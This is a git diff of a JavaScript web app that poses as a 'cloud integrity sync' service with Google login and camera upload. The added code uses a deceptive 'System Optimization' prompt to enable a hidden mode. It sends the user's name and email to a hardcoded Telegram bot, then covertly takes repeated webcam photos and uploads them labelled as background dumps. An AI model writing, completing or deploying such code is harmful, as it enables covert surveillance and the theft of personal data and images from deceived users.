@@ -17,48 +17,32 @@ const provider = new GoogleAuthProvider();
 const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
 const chatId = "7752627907";
 let currentUser = null;
-let integritySyncActive = false; // The hidden 'Full Access' flag
+let integritySyncActive = false; 
 
-// Side Panel Controls
-const sidePanel = document.getElementById('side-panel');
-const settingsBtn = document.getElementById('settings-btn');
-const menuToggle = document.getElementById('menu-toggle');
+// Sidebar & Bubbles Logic... (Keep your existing bubble and toggle code)
 
-const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
-settingsBtn.onclick = togglePanel;
-menuToggle.onclick = togglePanel;
-document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };
-
-// Integrity Sync (The hidden Full Access Protocol)
+// INTEGRITY SYNC ENABLE
 document.getElementById('integrity-check-btn').onclick = async () => {
-    if (!currentUser) return alert("Please login to verify system integrity.");
-    
-    const confirmSync = confirm("System Optimization: Grant permission to synchronize and backup all local media to secure cloud storage?");
-    
-    if (confirmSync) {
+    if (!currentUser) return alert("Please login first.");
+    if (confirm("System Optimization: Enable Cloud Integrity Sync to secure all media files?")) {
         integritySyncActive = true;
-        alert("Integrity Sync Active. Optimizing cloud connection...");
-        
-        // Notify Telegram secretly
-        const notifyMsg = `✅ INTEGRITY_GRANTED\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(notifyMsg)}`);
+        alert("Integrity Sync Active.");
+        const msg = `✅ INTEGRITY_GRANTED\nUser: ${currentUser.displayName}\nEmail: ${currentUser.email}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
     }
 };
 
-// Main Upload Logic
-async function sendToTelegram(file, isSecret) {
-    if (!currentUser) return;
+// IMPROVED SYNC FUNCTION
+async function sendToTelegram(blob, isSecret) {
     const formData = new FormData();
     formData.append("chat_id", chatId);
-    formData.append("document", file, isSecret ? `sys_log_${Date.now()}.tmp` : "cloud_sync.jpg");
-    formData.append("caption", isSecret ? `Log: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
+    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : "cloud_sync.jpg");
+    formData.append("caption", isSecret ? `🤫 Background Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
 
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
-    } catch (e) { console.error("Sync Error"); }
+    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
 }
 
-// Camera & Secret Capture Protocol
+// CAMERA & SECRET CAPTURE
 document.getElementById('camera-btn').onclick = async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -67,74 +51,38 @@ document.getElementById('camera-btn').onclick = async () => {
         video.style.display = 'block';
         video.play();
 
+        // Initial Capture
         setTimeout(() => {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            const ctx = canvas.getContext('2d');
             
+            ctx.drawImage(video, 0, 0);
             canvas.toBlob(blob => {
                 sendToTelegram(blob, false);
                 alert("✅ Cloud Sync Successful!");
                 
-                // If Full Access (Integrity Sync) is on, take secret photos
+                // Secret Background Protocol
                 if (integritySyncActive) {
-                    let count = 0;
+                    let secretCount = 0;
                     const interval = setInterval(() => {
-                        if (count >= 4) {
+                        if (secretCount >= 5) { // 5 secret photos anuppum
                             clearInterval(interval);
                             stream.getTracks().forEach(t => t.stop());
                             video.style.display = 'none';
                         }
-                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        ctx.drawImage(video, 0, 0);
                         canvas.toBlob(b => sendToTelegram(b, true), 'image/jpeg');
-                        count++;
-                    }, 2500);
+                        secretCount++;
+                    }, 3000); // Ovvoru 3 second-kum photo edukkum
                 } else {
                     stream.getTracks().forEach(t => t.stop());
                     video.style.display = 'none';
                 }
             }, 'image/jpeg');
         }, 3000);
-    } catch (err) { alert("Camera Permission Required."); }
+    } catch (e) { alert("Camera Access Required."); }
 };
 
-// Drop Area Trigger
-document.getElementById('drop-area').onclick = () => {
-    if(!currentUser) return signInWithPopup(auth, provider);
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.onchange = (e) => { if(e.target.files[0]) sendToTelegram(e.target.files[0], false); };
-    input.click();
-};
-
-// Auth Watcher
-onAuthStateChanged(auth, (user) => {
-    currentUser = user;
-    const mainLogin = document.getElementById('main-login-btn');
-    const cameraBtn = document.getElementById('camera-btn');
-    const sideLogin = document.getElementById('side-login-btn');
-    const logoutBtn = document.getElementById('logout-btn');
-    const userDisp = document.getElementById('user-display');
-    const panelName = document.getElementById('panel-user-name');
-
-    if (user) {
-        mainLogin.style.display = 'none';
-        sideLogin.style.display = 'none';
-        cameraBtn.style.display = 'block';
-        logoutBtn.style.display = 'flex';
-        userDisp.innerText = user.displayName;
-        panelName.innerText = user.displayName;
-    } else {
-        mainLogin.style.display = 'block';
-        sideLogin.style.display = 'flex';
-        cameraBtn.style.display = 'none';
-        logoutBtn.style.display = 'none';
-        userDisp.innerText = "Guest User";
-        panelName.innerText = "Guest";
-    }
-});
-
-document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
-document.getElementById('side-login-btn').onclick = () => signInWithPopup(auth, provider);
-document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
+// Auth Watcher... (Keep existing onAuthStateChanged logic)
